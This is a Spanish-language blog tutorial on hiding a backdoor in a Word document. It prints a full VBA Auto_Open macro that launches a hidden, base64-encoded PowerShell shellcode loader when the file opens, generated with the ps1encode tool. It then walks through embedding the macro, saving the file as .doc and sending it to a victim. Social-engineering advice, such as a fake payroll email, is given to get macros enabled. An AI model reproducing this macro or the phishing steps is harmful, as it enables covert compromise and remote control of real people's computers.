<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="es" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Como esconder un backdoor en un documento - shakar      Blog de ciberseguridad      </title>
<meta name="description" content="En este post te explico un metodo de intrusion, que consiste en esconder un backdoor en un documento">



<meta property="og:type" content="article">
<meta property="og:locale" content="es_ES">
<meta property="og:site_name" content="shakar | Blog de ciberseguridad">
<meta property="og:title" content="Como esconder un backdoor en un documento">
<meta property="og:url" content="http://localhost:4000/esconder-backdoor-en-documento/">


  <meta property="og:description" content="En este post te explico un metodo de intrusion, que consiste en esconder un backdoor en un documento">



  <meta property="og:image" content="http://localhost:4000/assets/images/esconder-backdoor-en-documento/banner-backdoor-intrusion.png">





  <meta property="article:published_time" content="2021-05-26T00:00:00+01:00">





  

  


<link rel="canonical" href="http://localhost:4000/esconder-backdoor-en-documento/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "shakarr",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="shakar | Blog de ciberseguridad Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Como esconder un backdoor en un documento</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/profilepic.jpg" alt="shakarr" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">shakarr</h3>
    
    
      <p class="author__bio" itemprop="description">
        Apasionado de la informática / Programador / Aspirante a experto en ciberseguridad
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://instagram.com/ridel_shakar" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram
          </a>
        </li>
      

      

      

      
        <li>
          <a href="https://github.com/shakarr" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Como esconder un backdoor en un documento">
    <meta itemprop="description" content="En este post te explico un metodo de intrusion, que consiste en esconder un backdoor en un documento">
    <meta itemprop="datePublished" content="May 26, 2021">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Como esconder un backdoor en un documento
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-05-26T00:00:00+01:00">May 26, 2021 </time>&emsp;
          
          
        </p>
        <p align="center">
<img src="/assets/images/esconder-backdoor-en-documento/man_in_doorway_newblog.png" width="50%" />
</p>

<p>En este post vamos a tratar un sencillo metodo de intrusión el cual consiste en esconde un backdoor en un documento, como puede ser word, pdf,…etc.</p>

<p>Primero vamos a necesitar una herramienta externa desde los repositorios de github, la cual es ps1encode: <strong>https://github.com/CroweCybersecurity/ps1encode</strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/CroweCybersecurity/ps1encode.git
</code></pre></div></div>

<p align="center">
<img src="/assets/images/esconder-backdoor-en-documento/img1.png" width="100%" />
</p>

<p>Al ejecutarlo vemos que nos muestra el modo de uso, el cual es bien sencillo, solo tenemos que pasarle los parametros necesarios, y como trabajamos con una conexión TCP debemos de pasarle el puerto y la IP origen.</p>

<blockquote>
  <p>NOTA: si quieres trabajar fuera de red local acuerdate de que tienes que abrir un puerto para tu ip pública</p>
</blockquote>

<p>En mi caso será dentro de red local por lo que no será necesario que abra ningún puerto. La configuración quedaría tal que así:</p>

<p align="center">
<img src="/assets/images/esconder-backdoor-en-documento/img2.png" width="100%" />
</p>

<p>Vemos que en la opción <strong>-t</strong> usaremos el encode de <strong>vba</strong>, en otra palabras visual basic for application, que como ya sabemos es el lenguaje de macros de microsoft que se usa para programar aplicaciones windows. En cuanto presionemos enter nos saldrá un rollo como este:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub Auto_Open()

stringA = "power"
stringB = "shell.exe -NoE -NoP -NonI -W Hidden -E "
            
string0="JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAH"
string1="MAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBj"
string2="ACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALA"
string3="AgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMA"
string4="dABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG"
string5="4AIAAkAGMAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAcwBjACAAPQAgADsAJABzAGkAegBlACAAPQAgADAAeAAxADAAMAAwADsAaQBm"
string6="ACAAKAAkAHMAYwAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwAHgAMQAwADAAMAApAHsAJABzAGkAegBlACAAPQAgACQAcwBjAC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAHMAaQB6AGUALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMA"
string7="A7ACQAaQAgAC0AbABlACAAKAAkAHMAYwAuAEwAZQBuAGcAdABoAC0AMQApADsAJABpACsAKwApACAAewAkAHcAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJAB4AC4AVABvAEkAbgB0ADMAMgAoACkAKwAkAGkAKQAsACAAJABzAGMAWwAkAGkAXQAsACAAMQApAH0AOwAkAHcAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUA"
string8="YQBkACgAMAAsADAALAAkAHgALAAwACwAMAAsADAAKQA7AGYAbwByACAAKAA7ADsAKQB7AFMAdABhAHIAdAAtAHMAbABlAGUAcAAgADYAMAB9ADsAJwA7ACQAZwBxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC"
string9="4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkADEAKQApADsAaQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA4ACkAewAkAHgAOAA2ACAAPQAgACQAZQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0ACAAKwAgACIAXABzAHkAcwB3AG8AdwA2ADQAXABX"
string10="AGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABjAG0AZAAgAD0AIAAiAC0AbgBvAHAAIAAtAG4AbwBuAGkAIAAtAGUAbgBjACAAIgA7AGkAZQB4ACAAIgAmACAAJAB4ADgANgAgACQAYwBtAGQAIAAkAGcAcQAiAH0AZQBsAHMAZQB7ACQAYwBtAGQAIAA9ACAAIg"
string11="AtAG4AbwBwACAALQBuAG8AbgBpACAALQBlAG4AYwAiADsAaQBlAHgAIAAiACYAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAJABjAG0AZAAgACQAZwBxACIAOwB9AA=="

stringFinal=stringA+stringB+string0+string1+string2+string3+string4+string5+string6+string7+string8+string9+string10+string11

    Shell stringFinal, 0
End Sub

Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub

</code></pre></div></div>

<p>El cual tenemos que copiar explicitamente.</p>

<p>Bien ahora tendremos que abrir un documento word, en el cual vamos a tener que habilitar la herramienta de desarrollador, nos dirigimos a <strong>archivo &gt; opciones &gt; personalizar cinta de opciones</strong> y seleccionamos desarrollador para que sea visible.</p>

<p>Una vez que ya hemos realizado el paso anterior pinchamos en desarrollador, nos vamos a visual basic(se encuantra en la barra de herramientas superior) y pinchamos en “this document” y se nos abrirá una ventana nueva. Esta ventana tiene dos apartados, en el primero de ellos por defecto estará en general, tenemos que cambiarlo a document, y luego cambiaremos, a su derecha, la opcion a “open”.</p>

<p>Ahora es importante eliminar todo lo que por defecto se haya escrito en la parte de debajo, borramos y pegamos lo que nos generó el ps1encode.</p>

<p>Bueno pues echo esto ya puedes cerrar la ventana de visual basic, de vuelta en el documento word escribe lo que queiras, un proyecto, un trabajo etc…
Cuando termines es importante que lo guardes con extensión .doc, ya que esta corresponde a word 97-2003.</p>

<p>Ya solo resta enviarlo a la víctima. Un pequeño detalle la víctima verá lo que haya en el word como si fuera un archivo corriente, pero leugo se le abrirá arriba un diálogo amarillo con lo siguiente <strong>“Haz click en habilitar macros para ver el contenido”</strong> con el boton correspondiente alado, aqui es donde entran tus dotes de ethical hacking ya que tendras que hacer que el emnsaje que hayas escrito en el word concuerde para qu eneustra víctima no sospeche cuando le salga el mensaje, una ejemplo en empresa podría ser el siguiente:</p>

<p><strong>“Buenas tardes, aqui les adjunto los informes correspondientes a las nóminas de la semana pasada”</strong></p>

<p>Viendo este mensaje más el que le sale mencionado anteriormente la víctima creera que tendrá que activar dicha opción para visualizar el contenido, ya esto queda a vuestra manera el como hacerlo.</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#ataques" class="page__taxonomy-item" rel="tag">Ataques</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#backdoor" class="page__taxonomy-item" rel="tag">Backdoor</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#hacking" class="page__taxonomy-item" rel="tag">hacking</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#tutoriales" class="page__taxonomy-item" rel="tag">Tutoriales</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#intrusion" class="page__taxonomy-item" rel="tag">Intrusion</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-05-26T00:00:00+01:00">May 26, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/creando-1000-hostpost/" class="pagination--pager" title="Creando 1000+ hotsposts
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2021 shakarr</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
